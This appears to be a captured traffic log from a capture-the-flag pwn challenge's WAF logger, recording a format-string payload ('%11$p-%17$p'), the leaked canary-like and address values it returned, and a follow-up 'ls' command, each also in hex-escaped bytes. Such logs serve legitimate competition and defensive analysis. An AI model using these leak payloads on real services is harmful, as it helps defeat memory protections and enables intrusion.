// Date: 2021-11-27 04:57:50
// SKYCTF PWN WAF
// Deved By I0gan
team_name: 划水队

user_name: 云想花容


<-------------------- read ------------------>
%11$p-%17$p

r_0 = "\x25\x31\x31\x24\x70\x2d\x25\x31\x37\x24\x70\x0a"

<-------------------- write ----------------->
0xdbf07b4dde0a6700-0x5607be6d09dc
V--+--

w_0 = "\x30\x78\x64\x62\x66\x30\x37\x62\x34\x64\x64\x65\x30\x61\x36\x37\x30\x30\x2d\x30\x78\x35\x36\x30\x37\x62\x65\x36\x64\x30\x39\x64\x63\x0a\x07\x56\x2d\x2d\x2b\x2d\x2d\x0a"

<-------------------- read ------------------>
ls

r_1 = "\x6c\x73\x0a"

<-------------------- write ----------------->
ls
$p-0x5607be6d09dc
Vlogger: chall env released
logger: sky_token_is_wrong

w_1 = "\x6c\x73\x0a\x24\x70\x2d\x30\x78\x35\x36\x30\x37\x62\x65\x36\x64\x30\x39\x64\x63\x0a\x07\x56"
